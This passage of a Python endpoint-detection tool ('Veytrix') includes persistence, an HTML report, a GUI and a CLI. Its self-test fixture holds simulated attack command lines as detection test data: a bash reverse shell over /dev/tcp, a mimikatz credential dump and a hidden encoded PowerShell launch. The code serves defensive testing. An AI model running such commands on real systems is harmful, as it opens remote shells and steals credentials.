        except Exception:
            pass
    min_conf = cfg.get("min_confidence", 0.0)
    if min_conf:
        findings = [f for f in findings if f.confidence >= min_conf]
    findings.sort(key=lambda f: (-SEV_RANK[f.severity], -f.confidence))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# Persistence
# ═════════════════════════════════════════════════════════════════════════════

def _init_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                fingerprint TEXT UNIQUE,
                rule_id TEXT, name TEXT, severity TEXT, confidence REAL,
                technique TEXT, affected_pid INTEGER, affected_process TEXT,
                affected_path TEXT, evidence TEXT, remediation TEXT,
                timestamp TEXT
            )
        """)
        conn.commit()
        conn.close()
    except Exception:
        pass


def save_findings_db(findings):
    try:
        conn = sqlite3.connect(DB_PATH)
        for f in findings:
            conn.execute(
                "INSERT OR IGNORE INTO findings "
                "(fingerprint, rule_id, name, severity, confidence, technique,"
                " affected_pid, affected_process, affected_path, evidence,"
                " remediation, timestamp)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (f.fingerprint, f.rule_id, f.name, f.severity,
                 f.confidence, f.technique, f.affected_pid,
                 f.affected_process, f.affected_path,
                 json.dumps(f.evidence), f.remediation, f.timestamp))
        # Trim to max
        conn.execute(
            "DELETE FROM findings WHERE id NOT IN "
            "(SELECT id FROM findings ORDER BY timestamp DESC LIMIT 500)")
        conn.commit()
        conn.close()
    except Exception:
        pass


def load_findings_db():
    if not os.path.exists(DB_PATH):
        return []
    try:
        conn = sqlite3.connect(DB_PATH)
        rows = conn.execute(
            "SELECT rule_id, name, severity, confidence, technique,"
            " affected_pid, affected_process, affected_path, evidence,"
            " remediation, timestamp, fingerprint"
            " FROM findings ORDER BY timestamp DESC LIMIT 500").fetchall()
        conn.close()
        out = []
        for r in rows:
            try:
                ev = json.loads(r[8]) if r[8] else []
            except Exception:
                ev = []
            out.append(Finding(
                r[0], r[1], r[2], r[3], ev, r[4],
                r[5], r[6] or "", r[9] or "", r[10] or "",
                r[11] or "", r[7] or ""))
        return out
    except Exception:
        return []


def clear_findings_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM findings")
        conn.commit()
        conn.close()
    except Exception:
        pass


# ═════════════════════════════════════════════════════════════════════════════
# Self-test
# ═════════════════════════════════════════════════════════════════════════════

def _self_test_context():
    ctx = SystemContext()
    ctx.own_pid = -1

    def add(pid, ppid, name, exe, cmd):
        p = ProcInfo(pid, ppid, name, exe, cmd, "test", time.time())
        ctx.processes.append(p)
        ctx.procs_by_pid[pid] = p

    add(9001, 1, "powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -nop -w hidden -enc SQBFAFgA")
    add(9002, 1, "WINWORD.EXE",
        r"C:\Program Files\Microsoft Office\root\WINWORD.EXE", "WINWORD.EXE d")
    add(9003, 9002, "cmd.exe", r"C:\Windows\System32\cmd.exe",
        "cmd /c whoami")
    add(9004, 1, "mimikatz.exe", r"C:\Users\Public\mimikatz.exe",
        "mimikatz.exe sekurlsa::logonpasswords")
    add(9005, 1, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1")
    add(9010, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost")
    add(9011, 9010, "svchost.exe", r"C:\Windows\System32\svchost.exe",
        "svchost")
    add(9020, 1, "custom.exe", r"C:\Users\bob\custom.exe", "custom.exe")
    add(9030, 1, "nginx", "/usr/sbin/nginx", "nginx: worker")
    add(9031, 9030, "bash", "/bin/bash", "bash")
    add(9040, 1, "chrome.exe",
        r"C:\Program Files\Google\Chrome\chrome.exe", "chrome.exe")
    add(9041, 9040, "powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe")
    ctx.connections.append(ConnInfo(9005, "bash", "1.2.3.4", 54321,
                                    "9.9.9.9", 4444, "ESTABLISHED"))
    ctx.conns_by_pid[9005] = [ctx.connections[-1]]
    return ctx


def run_self_test(cfg=None):
    if cfg is None:
        cfg = load_config()
    # Force-disable whitelist for self-test
    test_cfg = json.loads(json.dumps(cfg))
    test_cfg["whitelist"] = {"process_names": [], "paths_containing": [],
                              "rule_ids_disabled": [], "fingerprints": []}
    ctx = _self_test_context()
    findings = scan(ctx, test_cfg)
    expected = {"R-001", "R-004", "R-007", "R-011", "R-014",
                "R-015", "R-022", "R-024"}
    caught = {f.rule_id for f in findings}
    missing = expected - caught
    return missing, caught, len(expected)


# ═════════════════════════════════════════════════════════════════════════════
# HTML report
# ═════════════════════════════════════════════════════════════════════════════

def generate_html_report(findings, ctx, output):
    sev_color = {"low": "#28a745", "medium": "#ffc107",
                 "high": "#fd7e14", "critical": "#dc3545"}
    rows = []
    for f in findings:
        color = sev_color[f.severity]
        ev_html = "".join(f"<li>{html.escape(e)}</li>" for e in f.evidence)
        rem = (f'<p class="rem"><strong>Remediation:</strong> '
               f'{html.escape(f.remediation)}</p>' if f.remediation else '')
        rows.append(f"""
        <div class="finding" style="border-left-color:{color}">
          <h3><span class="badge" style="background:{color}">
            {f.severity.upper()}</span> {html.escape(f.name)}</h3>
          <p class="meta">Rule: {f.rule_id} · {f.technique} ·
             conf {int(f.confidence*100)}%</p>
          <ul>{ev_html}</ul>
          {rem}
        </div>""")
    plat = ctx.platform if ctx else "unknown"
    ts = ctx.scan_time if ctx else dt.datetime.now().isoformat()
    np = len(ctx.processes) if ctx else 0
    nc = len(ctx.connections) if ctx else 0
    html_out = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Veytrix Detection Report</title>
<style>
 body{{font-family:-apple-system,sans-serif;background:#0b1f3a;
      color:#e6edf7;max-width:960px;margin:2rem auto;padding:0 1rem}}
 h1{{color:#00a3ff}} .summary{{background:#16283f;padding:1rem;
      border-radius:8px;margin-bottom:2rem}}
 .finding{{background:#16283f;padding:1rem;border-radius:8px;
      margin-bottom:1rem;border-left:4px solid}}
 .badge{{color:#fff;padding:2px 8px;border-radius:4px;font-size:.8em}}
 .meta{{color:#8899aa;font-size:.9em}} li{{font-family:monospace;
      font-size:.9em;color:#b0c4de}}
 .rem{{background:#1a3350;padding:.5rem;border-radius:4px;font-size:.9em}}
 .clean{{color:#28a745;font-size:1.2em}}
</style></head><body>
<h1>Veytrix Detection Report</h1>
<div class="summary">
 <p>Generated: {ts}</p>
 <p>Platform: {plat} · Processes: {np} ·
    Connections: {nc} · Findings: {len(findings)}</p>
</div>
{''.join(rows) if rows else '<p class="clean">✓ No findings.</p>'}
</body></html>"""
    Path(output).write_text(html_out, encoding="utf-8")
    return output


# ═════════════════════════════════════════════════════════════════════════════
# GUI
# ═════════════════════════════════════════════════════════════════════════════

DARK = "#0B1F3A"
PANEL = "#16283F"
PANEL2 = "#1E324B"
FG = "#E6EDF7"
ACCENT = "#00A3FF"
SEV_FG = {"low": "#A5D6A7", "medium": "#FFE082",
          "high": "#FFAB91", "critical": "#EF9A9A"}


class VeytrixGUI:
    def __new__(cls, *a, **kw):
        if not HAS_TK:
            raise RuntimeError("tkinter not available")
        return super().__new__(cls)

    def __init__(self):
        _init_db()
        self.config = load_config()

        self.root = tk.Tk()
        self.root.title(f"Veytrix Detection Engine  V{VERSION}")
        self.root.geometry("1280x820")
        self.root.minsize(900, 600)
        self.root.configure(bg=DARK)

        self.queue_ = queue.Queue()
        self.findings = []
        self.ctx = None
        self.scanning = False
        self.last_scan_time = "—"
        self.filter_var = tk.StringVar()
        self.filter_var.trace_add("write", lambda *_: self._apply_filter())
        self.sort_col = None
        self.sort_reverse = False

        self._build_ui()
        self._build_styles()
        self.root.after(100, self._drain_queue)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        # Load persisted findings
        if self.config.get("persist_findings"):
            old = load_findings_db()
            if old:
                self.findings = old
                self._populate(old)
                self._update_stats(None, old)
                self._status(
                    f"Loaded {len(old)} finding(s) from previous scans.",
                    ACCENT)

        # Auto-scan on start
        if self.config.get("auto_scan_on_start") and HAS_PSUTIL:
            self.root.after(800, self._auto_scan_tick)
        else:
            self._status(
                "Ready. Click 'Scan Now' to begin.", "#8899AA")

        if not HAS_PSUTIL:
            messagebox.showwarning(
                "psutil missing",
                "psutil is not installed — scanning disabled.\n\n"
                "Install:  pip install psutil")
        if not HAS_CRYPTO:
            self._status(
                "psutil OK · cryptography missing (TLS check disabled)",
                "#FFB74D")

    # ── UI ────────────────────────────────────────────────────────────
    def _build_styles(self):
        s = ttk.Style(self.root)
        try:
            s.theme_use("clam")
        except tk.TclError:
            pass
        s.configure("Treeview", background=PANEL, foreground=FG,
                    fieldbackground=PANEL, rowheight=26,
                    font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10))
        s.configure("Treeview.Heading", background=DARK, foreground=ACCENT,
                    font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                          10, "bold"))
        s.map("Treeview", background=[("selected", ACCENT)],
              foreground=[("selected", "#FFFFFF")])

    def _build_ui(self):
        # Header
        header = tk.Frame(self.root, bg=DARK, height=70)
        header.pack(fill="x", padx=16, pady=(12, 0))
        header.pack_propagate(False)
        tk.Label(header, text="VEYTRIX", bg=DARK, fg=ACCENT,
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       22, "bold")).pack(side="left")
        tk.Label(header, text="  Detection Engine", bg=DARK, fg=FG,
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       14)).pack(side="left", padx=(6, 0))
        tk.Label(header, text=f"V{VERSION}", bg=DARK, fg="#8899AA",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       10)).pack(side="left", padx=(10, 0))

        bf = tk.Frame(header, bg=DARK)
        bf.pack(side="right")
        plat = platform.system()
        admin = SystemContext._check_admin()
        self._badge(bf, plat, "#0D47A1")
        self._badge(bf, "ADMIN" if admin else "USER",
                    "#2E7D32" if admin else "#B71C1C")
        interval = self.config.get("auto_scan_interval_sec", 30)
        if interval > 0:
            self._badge(bf, f"AUTO {interval}s", "#6A1B9A")

        # Toolbar
        toolbar = tk.Frame(self.root, bg=DARK)
        toolbar.pack(fill="x", padx=16, pady=8)

        self.btn_scan = self._btn(toolbar, "▶  Scan Now",
                                    lambda: self._start_scan(False), True)
        self.btn_scan.pack(side="left", padx=(0, 6))
        self.btn_checks = self._btn(toolbar, "Scan + Coverage",
                                     lambda: self._start_scan(True))
        self.btn_checks.pack(side="left", padx=(0, 6))
        self.btn_self = self._btn(toolbar, "Self-Test",
                                    self._do_self_test)
        self.btn_self.pack(side="left", padx=(0, 6))
        self.btn_report = self._btn(toolbar, "Export",
                                     self._do_report)
        self.btn_report.pack(side="left", padx=(0, 6))
        self.btn_clear = self._btn(toolbar, "Clear",
                                     self._do_clear)
        self.btn_clear.pack(side="left", padx=(0, 6))

        # Stats
        stats = tk.Frame(self.root, bg=PANEL, height=60)
        stats.pack(fill="x", padx=16, pady=(0, 8))
        stats.pack_propagate(False)
        self.stat_labels = {}
        for key, label in [("procs", "Processes"), ("conns", "Connections"),
                            ("findings", "Findings"), ("critical", "Critical"),
                            ("high", "High"), ("time", "Last Scan")]:
            f = tk.Frame(stats, bg=PANEL, padx=14, pady=8)
            f.pack(side="left", fill="y")
            tk.Label(f, text=label, bg=PANEL, fg="#8899AA",
                     font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                           9)).pack(anchor="w")
            lbl = tk.Label(f, text="—", bg=PANEL, fg=ACCENT,
                            font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                                  16, "bold"))
            lbl.pack(anchor="w")
            self.stat_labels[key] = lbl

        # Filter
        fbar = tk.Frame(self.root, bg=DARK)
        fbar.pack(fill="x", padx=16, pady=(0, 4))
        tk.Label(fbar, text="Filter:", bg=DARK, fg=FG,
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10)
                 ).pack(side="left")
        tk.Entry(fbar, textvariable=self.filter_var, bg=PANEL, fg=FG,
                 insertbackground=FG, relief="flat",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10)
                 ).pack(side="left", fill="x", expand=True, padx=6)

        # Pane
        pane = tk.PanedWindow(self.root, bg=DARK, sashwidth=4,
                              sashrelief="flat")
        pane.pack(fill="both", expand=True, padx=16, pady=(0, 8))
        left = tk.Frame(pane, bg=DARK)
        tk.Label(left, text="Findings", bg=DARK, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       12, "bold")).pack(anchor="w", pady=(0, 6))
        tf = tk.Frame(left, bg=DARK)
        tf.pack(fill="both", expand=True)
        cols = ("sev", "rule", "name", "process", "pid", "tech", "conf")
        self.tree = ttk.Treeview(tf, columns=cols, show="headings")
        for c, w, h in [("sev", 80, "Severity"), ("rule", 70, "Rule"),
                        ("name", 280, "Finding"),
                        ("process", 160, "Process"), ("pid", 60, "PID"),
                        ("tech", 80, "MITRE"), ("conf", 60, "Conf%")]:
            self.tree.heading(c, text=h,
                                command=lambda cc=c: self._sort_by(cc))
            self.tree.column(c, width=w, anchor="w")
        for sev, color in SEV_FG.items():
            self.tree.tag_configure(sev, foreground=color)
        scroll = ttk.Scrollbar(tf, orient="vertical",
                                command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")
        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.tree.bind("<Button-3>", self._on_right_click)
        pane.add(left, minsize=500)

        right = tk.Frame(pane, bg=PANEL)
        tk.Label(right, text="Details", bg=PANEL, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       12, "bold"), padx=12, pady=8,
                 anchor="w").pack(fill="x")
        self.detail_text = tk.Text(
            right, bg=PANEL2, fg=FG, relief="flat", wrap="word",
            font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10),
            padx=12, pady=12, state="disabled")
        self.detail_text.pack(fill="both", expand=True)
        self.detail_text.tag_configure("h", foreground=ACCENT,
                                        font=("Segoe UI"
                                              if IS_WINDOWS
                                              else "DejaVu Sans",
                                              12, "bold"))
        self.detail_text.tag_configure("lbl", foreground="#8899AA",
                                        font=("Segoe UI"
                                              if IS_WINDOWS
                                              else "DejaVu Sans",
                                              9, "bold"))
        self.detail_text.tag_configure("mono", foreground="#B0C4DE",
                                        font=("Consolas"
                                              if IS_WINDOWS
                                              else "DejaVu Sans Mono", 9))
        self.detail_text.tag_configure("rem", foreground="#FFE082")
        pane.add(right, minsize=300)

        self.status = tk.Label(self.root, text="Ready.",
                                bg=DARK, fg="#8899AA", anchor="w",
                                padx=16, pady=6,
                                font=("Segoe UI"
                                      if IS_WINDOWS
                                      else "DejaVu Sans", 9))
        self.status.pack(fill="x", side="bottom")

    def _badge(self, parent, text, color):
        tk.Label(parent, text=f" {text} ", bg=color, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       9, "bold"), padx=6, pady=2).pack(side="left", padx=3)

    def _btn(self, parent, text, cmd, primary=False):
        return tk.Button(
            parent, text=text, command=cmd, relief="flat", bd=0,
            padx=16, pady=8,
            bg=ACCENT if primary else PANEL, fg="#FFFFFF",
            activebackground="#0088DD", activeforeground="#FFFFFF",
            font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10,
                  "bold" if primary else "normal"), cursor="hand2")

    # ── Auto-scan ─────────────────────────────────────────────────────
    def _auto_scan_tick(self):
        interval = self.config.get("auto_scan_interval_sec", 30)
        if interval <= 0:
            return
        if not self.scanning and HAS_PSUTIL:
            self._start_scan(False, auto=True)
        self.root.after(interval * 1000, self._auto_scan_tick)

    def _start_scan(self, checks=False, auto=False):
        if not HAS_PSUTIL:
            messagebox.showerror(
                "psutil required",
                "psutil is not installed.\n\n"
                "Install:  pip install psutil")
            return
        if self.scanning:
            return
        self.scanning = True
        self._set_busy(True,
                        "Scanning…" if not auto else "Auto-scan in progress…")

        def worker():
            try:
                ctx = SystemContext.capture()
                findings = scan(ctx, self.config)
                self.queue_.put(("done", ctx, findings, checks))
            except Exception as exc:
                self.queue_.put(("error", str(exc), None, False))

        threading.Thread(target=worker, daemon=True).start()

    def _do_self_test(self):
        if not HAS_PSUTIL:
            messagebox.showerror("psutil required",
                                  "Install:  pip install psutil")
            return
        self._set_busy(True, "Running self-test…")

        def worker():
            try:
                missing, caught, expected = run_self_test(self.config)
                self.queue_.put(("selftest", missing, caught, expected))
            except Exception as exc:
                self.queue_.put(("error", str(exc), None, False))

        threading.Thread(target=worker, daemon=True).start()

    def _do_report(self):
        if not self.findings:
            messagebox.showinfo("Nothing to export",
                                  "Run a scan first.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML report", "*.html"), ("All files", "*.*")],
            initialfile="veytrix_report.html")
        if not path:
            return
        try:
            generate_html_report(self.findings,
                                  self.ctx or SystemContext(),
                                  path)
            self._status(f"✓ Report saved: {path}", "#A5D6A7")
        except Exception as exc:
            messagebox.showerror("Export failed", str(exc))

    def _do_clear(self):
        if not self.findings:
            return
        if not messagebox.askyesno(
                "Clear all findings?",
                "This will remove all findings from the table "
                "and delete them from the database.\n\nContinue?"):
            return
        self.findings = []
        self.tree.delete(*self.tree.get_children())
        self.detail_text.configure(state="normal")
        self.detail_text.delete("1.0", "end")
        self.detail_text.configure(state="disabled")
        clear_findings_db()
        self._status("Findings cleared.", "#FFB74D")

    # ── Queue drain ──────────────────────────────────────────────────
    def _drain_queue(self):
        try:
            while True:
                kind, a, b, c = self.queue_.get_nowait()
                if kind == "error":
                    self.scanning = False
                    self._set_busy(False, "")
                    self._status(f"✗ Scan failed: {a}", "#EF9A9A")
                    messagebox.showerror("Scan failed", a)
                    continue
                if kind == "selftest":
                    self._on_selftest(a, b, c)
                elif kind == "done":
                    self._on_scan_done(a, b, c)
        except queue.Empty:
            pass
        self.root.after(100, self._drain_queue)

    def _on_scan_done(self, ctx, findings, checks):
        self.scanning = False
        self.ctx = ctx
        self.findings = findings
        self.last_scan_time = dt.datetime.now().strftime("%H:%M:%S")
        self._populate(findings)
        self._update_stats(ctx, findings)
        self._set_busy(False, "")

        if self.config.get("persist_findings"):
            save_findings_db(findings)

        crit = sum(1 for f in findings if f.severity == "critical")
        high = sum(1 for f in findings if f.severity == "high")
        msg = (f"✓ Scan complete — {len(findings)} finding(s). "
                f"{crit} critical, {high} high.")
        color = "#EF9A9A" if crit else ("#FFAB91" if high else "#A5D6A7")
        self._status(msg, color)

        if checks:
            self._show_coverage(ctx)

    def _on_selftest(self, missing, caught, expected):
        self._set_busy(False, "")
        if missing:
            self._status(
                f"✗ Self-test FAILED — missing {sorted(missing)}",
                "#EF9A9A")
            messagebox.showerror(
                "Self-test FAILED",
                f"Missing rules: {sorted(missing)}\n\n"
                "Detection engine may be broken.")
        else:
            self._status(
                f"✓ Self-test passed — {expected} rules fired.",
                "#A5D6A7")
            messagebox.showinfo(
                "Self-test passed",
                f"All {expected} expected rules fired.\n"
                f"Detection engine is working.")

    def _show_coverage(self, ctx):
        ran = sum(1 for c in ctx.checks if c.status == "ran")
        denied = sum(1 for c in ctx.checks if c.status == "denied")
        skipped = sum(1 for c in ctx.checks if c.status == "skipped")
        text = (f"Ran: {ran}   Denied: {denied}   Skipped: {skipped}\n\n")
        for c in ctx.checks:
            text += f"  [{c.status}] {c.name}"
            if c.reason:
                text += f" — {c.reason}"
            text += "\n"
        if denied:
            text += (f"\n⚠ Run as "
                     f"{'Administrator' if IS_WINDOWS else 'root'} "
                     f"for full coverage.")
        messagebox.showinfo("Coverage report", text)

    # ── Table ─────────────────────────────────────────────────────────
    def _populate(self, findings):
        self.tree.delete(*self.tree.get_children())
        for f in findings:
            self._insert_row(f)

    def _insert_row(self, f):
        if f.fingerprint in self.tree.get_children(""):
            return
        self.tree.insert("", "end", iid=f.fingerprint, values=(
            f.severity.upper(), f.rule_id, f.name,
            f.affected_process or "—",
            f.affected_pid if f.affected_pid else "—",
            f.technique, int(f.confidence * 100)),
            tags=(f.severity,))

    def _apply_filter(self):
        q = self.filter_var.get().lower().strip()
        self.tree.delete(*self.tree.get_children())
        for f in self.findings:
            if q and not (
                q in f.name.lower() or q in f.rule_id.lower()
                or q in (f.affected_process or "").lower()
                or q in f.severity.lower() or q in f.technique.lower()
                or any(q in e.lower() for e in f.evidence)
            ):
                continue
            self._insert_row(f)

    def _sort_by(self, col):
        if self.sort_col == col:
            self.sort_reverse = not self.sort_reverse
        else:
            self.sort_col = col
            self.sort_reverse = False
        items = self.tree.get_children("")
        if col == "sev":
            data = [(self.tree.set(i, col), i) for i in items]
            data.sort(key=lambda x: SEV_RANK.get(x[0].lower(), 0),
                       reverse=self.sort_reverse)
        elif col in ("conf", "pid"):
            def _k(x):
                try:
                    return int(x[0])
                except Exception:
                    return 999999
            data = [(self.tree.set(i, col), i) for i in items]
            data.sort(key=_k, reverse=self.sort_reverse)
        else:
            data = [(self.tree.set(i, col).lower(), i) for i in items]
            data.sort(key=lambda x: x[0], reverse=self.sort_reverse)
        for idx, (_, iid) in enumerate(data):
            self.tree.move(iid, "", idx)

    def _on_select(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        f = next((x for x in self.findings
                  if x.fingerprint == sel[0]), None)
        if f:
            self._show_detail(f)

    def _show_detail(self, f):
        t = self.detail_text
        t.configure(state="normal")
        t.delete("1.0", "end")
        t.insert("end", f"{f.severity.upper()}  {f.name}\n", "h")
        t.insert("end", "\n")
        t.insert("end", "RULE        ", "lbl")
        t.insert("end", f"{f.rule_id}\n")
        t.insert("end", "TECHNIQUE   ", "lbl")
        t.insert("end", f"{f.technique}\n")
        t.insert("end", "CONFIDENCE  ", "lbl")
        t.insert("end", f"{int(f.confidence*100)}%\n")
        if f.affected_pid:
            t.insert("end", "PROCESS     ", "lbl")
            t.insert("end", f"{f.affected_process} (PID {f.affected_pid})\n")
        if f.affected_path:
            t.insert("end", "PATH        ", "lbl")
            t.insert("end", f"{f.affected_path}\n")
        t.insert("end", "TIME        ", "lbl")
        t.insert("end", f"{f.timestamp}\n")
        t.insert("end", "\nEvidence:\n", "lbl")
        for ev in f.evidence:
            t.insert("end", f"  • {ev}\n", "mono")
        if f.remediation:
            t.insert("end", "\nRemediation:\n", "lbl")
            t.insert("end", f"  → {f.remediation}\n", "rem")
        t.configure(state="disabled")

    # ── Right-click whitelist menu ───────────────────────────────────
    def _on_right_click(self, event):
        iid = self.tree.identify_row(event.y)
        if not iid:
            return
        self.tree.selection_set(iid)
        f = next((x for x in self.findings if x.fingerprint == iid), None)
        if not f:
            return
        menu = tk.Menu(self.root, tearoff=0)
        if f.affected_process:
            menu.add_command(
                label=f"Whitelist process: {f.affected_process}",
                command=lambda: self._whitelist_process(f))
        if f.affected_path:
            menu.add_command(
                label=f"Whitelist path: {f.affected_path[:50]}…",
                command=lambda: self._whitelist_path(f))
        menu.add_command(
            label=f"Disable rule {f.rule_id}",
            command=lambda: self._disable_rule(f))
        menu.add_separator()
        menu.add_command(
            label="Dismiss this finding",
            command=lambda: self._dismiss(f))
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    def _whitelist_process(self, f):
        wl = self.config["whitelist"]
        name = f.affected_process.lower()
        if name not in wl["process_names"]:
            wl["process_names"].append(name)
            save_config(self.config)
            self._status(f"Whitelisted process: {name}", "#A5D6A7")

    def _whitelist_path(self, f):
        wl = self.config["whitelist"]
        p = os.path.dirname(f.affected_path) or f.affected_path
        if p not in wl["paths_containing"]:
            wl["paths_containing"].append(p)
            save_config(self.config)
            self._status(f"Whitelisted path: {p}", "#A5D6A7")

    def _disable_rule(self, f):
        wl = self.config["whitelist"]
        if f.rule_id not in wl["rule_ids_disabled"]:
            wl["rule_ids_disabled"].append(f.rule_id)
            save_config(self.config)
            self._status(f"Rule disabled: {f.rule_id}", "#FFB74D")

    def _dismiss(self, f):
        self.findings = [x for x in self.findings
                          if x.fingerprint != f.fingerprint]
        try:
            self.tree.delete(f.fingerprint)
        except Exception:
            pass
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM findings WHERE fingerprint = ?",
                          (f.fingerprint,))
            conn.commit()
            conn.close()
        except Exception:
            pass

    def _update_stats(self, ctx, findings):
        if ctx:
            self.stat_labels["procs"].configure(text=str(len(ctx.processes)))
            self.stat_labels["conns"].configure(text=str(len(ctx.connections)))
        self.stat_labels["findings"].configure(text=str(len(findings)))
        self.stat_labels["critical"].configure(
            text=str(sum(1 for f in findings if f.severity == "critical")))
        self.stat_labels["high"].configure(
            text=str(sum(1 for f in findings if f.severity == "high")))
        self.stat_labels["time"].configure(text=self.last_scan_time)

    def _set_busy(self, busy, msg=""):
        st = "disabled" if busy else "normal"
        for b in (self.btn_scan, self.btn_checks, self.btn_self,
                  self.btn_report):
            b.configure(state=st)
        if msg:
            self._status(msg, ACCENT)

    def _status(self, text, color="#8899AA"):
        self.status.configure(text=text, fg=color)

    def _on_close(self):
        try:
            self.root.destroy()
        except Exception:
            pass

    def run(self):
        self.root.mainloop()


# ═════════════════════════════════════════════════════════════════════════════
# CLI
# ═════════════════════════════════════════════════════════════════════════════

class C:
    RED, ORANGE, YELLOW = "\033[91m", "\033[38;5;208m", "\033[93m"
    GREEN, CYAN, BOLD, DIM, RESET = (
        "\033[92m", "\033[96m", "\033[1m", "\033[2m", "\033[0m")

SEV_COLOR = {"low": C.GREEN, "medium": C.YELLOW,
             "high": C.ORANGE, "critical": C.RED}


def _print_findings(findings, ctx):
    print(f"\n{C.BOLD}{C.CYAN}═══ VEYTRIX DETECTION — "
          f"{ctx.scan_time[:19]}Z ═══{C.RESET}\n")
    print(f"  Processes: {len(ctx.processes)}  |  "
          f"Connections: {len(ctx.connections)}  |  "
          f"Findings: {len(findings)}\n")
    if not findings:
        print(f"{C.GREEN}  ✓ No suspicious activity detected.{C.RESET}\n")
        return
    for i, f in enumerate(findings, 1):
        color = SEV_COLOR[f.severity]
        print(f"[{i}] {color}{f.severity.upper()}{C.RESET}  "
              f"{C.BOLD}{f.name}{C.RESET}  "
              f"{C.DIM}({f.rule_id} · {f.technique} · "
              f"{int(f.confidence*100)}%){C.RESET}")
        for ev in f.evidence:
            print(f"    • {ev}")
        if f.remediation:
            print(f"    → {f.remediation}")
        print()


def _cli_main(argv):
    p = argparse.ArgumentParser(
        prog="veytrix_detect",
        description="Veytrix Detection Engine — GUI by default")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    p.add_argument("--no-gui", action="store_true")
    sub = p.add_subparsers(dest="cmd", required=False)

    sp = sub.add_parser("scan")
    sp.add_argument("--json", action="store_true")
    sp.add_argument("--checks", action="store_true")
    sp.add_argument("--report")

    sp = sub.add_parser("watch")
    sp.add_argument("--interval", type=int, default=30)

    sp = sub.add_parser("report")
    sp.add_argument("--out", default="veytrix_report.html")

    sub.add_parser("self-test")

    args = p.parse_args(argv)

    if not HAS_PSUTIL and args.cmd != "self-test":
        print(f"{C.RED}psutil missing — install: pip install psutil"
              f"{C.RESET}")
        return 1

    cfg = load_config()

    if args.cmd == "scan":
        ctx = SystemContext.capture()
        findings = scan(ctx, cfg)
        if args.json:
            print(json.dumps({
                "scan_time": ctx.scan_time, "platform": ctx.platform,
                "findings": [{"rule": f.rule_id, "name": f.name,
                               "severity": f.severity,
                               "confidence": f.confidence,
                               "technique": f.technique,
                               "pid": f.affected_pid,
                               "process": f.affected_process,
                               "evidence": f.evidence,
                               "remediation": f.remediation}
                              for f in findings]}, indent=2))
        else:
            _print_findings(findings, ctx)
            if args.checks:
                for c in ctx.checks:
                    print(f"  [{c.status}] {c.name}"
                          + (f" — {c.reason}" if c.reason else ""))
            if args.report:
                path = generate_html_report(findings, ctx, args.report)
                print(f"\nReport: {path}")
        return 0 if not any(f.severity in ("high", "critical")
                            for f in findings) else 2

    if args.cmd == "watch":
        seen = set()
        try:
            while True:
                ctx = SystemContext.capture()
                findings = scan(ctx, cfg)
                new = [f for f in findings if f.fingerprint not in seen]
                if new:
                    for f in new:
                        seen.add(f.fingerprint)
                    _print_findings(new, ctx)
                    save_findings_db(new)
                else:
                    print(f"{C.DIM}[{dt.datetime.now():%H:%M:%S}] "
                          f"no new findings{C.RESET}")
                time.sleep(args.interval)
        except KeyboardInterrupt:
            return 0

    if args.cmd == "report":
        ctx = SystemContext.capture()
        findings = scan(ctx, cfg)
        print(f"Report: {generate_html_report(findings, ctx, args.out)}")
        return 0

    if args.cmd == "self-test":
        missing, caught, expected = run_self_test(cfg)
        if missing:
            print(f"{C.RED}✗ Self-test failed — missing: "
                  f"{sorted(missing)}{C.RESET}")
            return 1
        print(f"{C.GREEN}✓ Self-test passed — {expected} rules fired."
              f"{C.RESET}")
        return 0

    p.print_help()
    return 0


# ═════════════════════════════════════════════════════════════════════════════
# Entry
# ═════════════════════════════════════════════════════════════════════════════

def main() -> int:
    argv = sys.argv[1:]
    force_cli = ("--no-gui" in argv
                  or any(a in argv for a in
                         ("scan", "watch", "report", "self-test")))
    if force_cli or not HAS_TK:
        return _cli_main(argv)
    try:
        VeytrixGUI().run()
        return 0
    except Exception as exc:
        import traceback
        print(f"GUI failed: {exc}", file=sys.stderr)
        traceback.print_exc()
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass
        return 1


if __name__ == "__main__":
    sys.exit(main())
